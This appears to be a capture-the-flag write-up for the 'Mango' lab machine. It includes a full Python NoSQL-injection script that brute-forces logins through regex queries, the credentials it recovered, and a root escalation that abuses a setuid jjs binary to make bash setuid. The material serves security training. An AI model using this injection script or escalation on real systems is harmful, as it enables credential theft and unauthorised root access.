# Mango
>Author : Xyan1d3
>Date : 16th July 2021
>IP : 10.10.10.162
>OS : Linux
>Difficulty : Medium
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Fri Jul 16 23:19:55 2021 as: nmap -sC -sV -v -oN nmap/mango 10.10.10.162
Nmap scan report for 10.10.10.162
Host is up (0.086s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Issuer: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-09-27T14:21:19
| Not valid after:  2020-09-26T14:21:19
| MD5:   b797 d14d 485f eac3 5cc6 2fed bb7a 2ce6
|_SHA-1: b329 9eca 2892 af1b 5895 053b f30e 861f 1c03 db95
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Web Enumeration
The page `http` page gives us a `403 Forbidden`.
But, The `https` site presents us with an self signed SSL Certificate which leaks a domain name.
![[Pasted image 20210716232146.png]]

We add those entries on our `/etc/hosts` file.

We have some credentials but it does not work.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.7]─[~/htb/mango/nosqli]
└──╼ # python3 nosqli.py 
[+] Username Length : 5

[*] Trying admin
[+] Password Length : 12

[*] Trying t9KcS3>!0B#2
```

So, We may try some other username by blacklisting the `a` character in the 1st username bruteforce.
###  NoSQLi script
```python
import requests
import string
from icecream import ic
import sys


url = "http://staging-order.mango.htb/"
proxies={}
headers = {"Content-Type": "application/x-www-form-urlencoded"}

def creds_length(*args):
    global req
    req = requests.session()
    req.get(url)
    for i in range(100):
        if len(args) == 0:
            data = "username[$regex]=^.{" + str(i) + "}$&password[$ne]=toto&login=login"
        elif len(args) == 1:
            data = "username[$regex]=^" + args[0] + "$&password[$regex]=^.{" + str(i) + "}$&login=login"
        op = req.post(url=url,proxies=proxies,data=data,headers=headers,allow_redirects=False)
        if op.status_code == 302 and len(args) == 0:
            print(f"[+] Username Length : {i}\n")
            return i
        elif op.status_code == 302 and len(args) == 1:
            print(f"[+] Password Length : {i}\n")
            return i

def bruteforce(ulen,*args):
    store = ""
    charlist = "mangoh3mXK8RhU~f{]f" +"!@#$%^()-=_+`~\{\}[]\<>,/:\";\'`" + string.ascii_letters + string.digits #string.punctuation.replace("&" , "").replace("*" , "")
    while len(store)!= ulen:
        old_len = len(store)
        for each in charlist:
            if len(args) == 0:
                if len(store) == 0 and each == "a":
                    continue
                data = "username[$regex]=^" + store + each + "&password[$ne]=toto&login=login"
            if len(args) == 1:
                data = "username[$regex]=^" + args[0] + "&password[$regex]=^"+ store + each +"&login=login"
            sys.stdout.write(f"\r[*] Trying {store+each}")
            sys.stdout.flush()
            op = req.post(url=url,proxies=proxies,data=data,headers=headers,allow_redirects=False)
            if op.status_code == 302:
                store += each
                break
        if len(store) == old_len:
            print("\n[-] Fucked Up")
    print()

if __name__ == '__main__':
    ulen = creds_length()
    bruteforce(ulen)
    bruteforce(creds_length("mango"),"mango")

    # !@#$%^()-=_+`~{}|[]\<>?,./:";'`
    # 

```

We get the other credential.
```python
┌─[Magisk@Xyan1d3]─[17.17.17.9]─[~/htb/mango]
└──╼ # python3 nosqli/nosqli.py 
[+] Username Length : 5

[*] Trying mango
[+] Password Length : 16

[*] Trying h3mXK8RhU~f{]f5H
```

## Credentials
|Username|Password|
|--|--|
|admin|`t9KcS3>!0B#2`|
|mango|`h3mXK8RhU~f{]f5H`|

# Initial FootHold as mango
We could now `SSH` into the box using the credentials `mango` and `h3mXK8RhU~f{]f5H`.
![[Pasted image 20210717121222.png]]

```python
Last login: Fri Jul 16 21:44:55 2021 from 10.10.14.7
mango@mango:~$ id
uid=1000(mango) gid=1000(mango) groups=1000(mango)
mango@mango:~$ whoami
mango
```

# User Escalation as admin
We use the credentials of the `admin` user and `su` into the box.
```python
mango@mango:~$ su - admin
Password: 
$ bash -i
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@mango:/home/admin$ id
uid=4000000000(admin) gid=1001(admin) groups=1001(admin)
admin@mango:/home/admin$ whoami
admin
```

## Getting the user Flag
```python
admin@mango:/home/admin$ ls -l
total 4
-r-------- 1 admin admin 33 Jul 16 17:42 user.txt
admin@mango:/home/admin$ cat user.txt 
a671b91e255d0e9baaee53e8b44a1535
```

# Root Escalation
We check for all the `setuid` binaries on the box and find out that we have a `jjs` binary which has the `setuid` capability.
```python
admin@mango:/home/admin$ find / -perm /4000 2> /dev/null

*** SNIP ***

/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs

*** SNIP ***
```

We could abuse the `setuid` capability and get escalated to `root`.
```python
admin@mango:/home/admin$ echo "Java.type('java.lang.Runtime').getRuntime().exec('chmod +s /bin/bash').waitFor()" | jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type('java.lang.Runtime').getRuntime().exec('chmod +s /bin/bash').waitFor()
0
jjs> admin@mango:/home/admin$ bash -p
bash-4.4# id
uid=4000000000(admin) gid=1001(admin) euid=0(root) egid=0(root) groups=0(root),1001(admin)
bash-4.4# whoami
root
```

## Getting the root Flag
```python
bash-4.4# cd /root/
bash-4.4# ls -l
total 4
-r-------- 1 root root 33 Jul 16 17:42 root.txt
bash-4.4# cat root.txt 
a3355880ed3c681aeab23746c60ddba5
```